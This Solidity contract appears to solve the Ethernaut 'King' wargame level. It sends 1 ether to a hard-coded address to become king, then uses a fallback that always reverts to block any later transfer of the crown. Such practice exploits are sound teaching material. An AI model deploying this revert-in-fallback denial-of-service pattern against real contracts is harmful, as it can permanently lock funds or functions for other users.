// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

contract BadKing {
    address payable public king  = payable(0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5);
    
    // Create a malicious contract and seed it with some Ethers
    constructor() {}
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing() public {
        (bool success, ) = king.call{value: 1000000000000000000}("");
        require(success, "Transfer failed");
    }
    
    // This function fails "king.transfer" trx from Ethernaut
    fallback() external payable {
        revert("haha you fail");
    }
}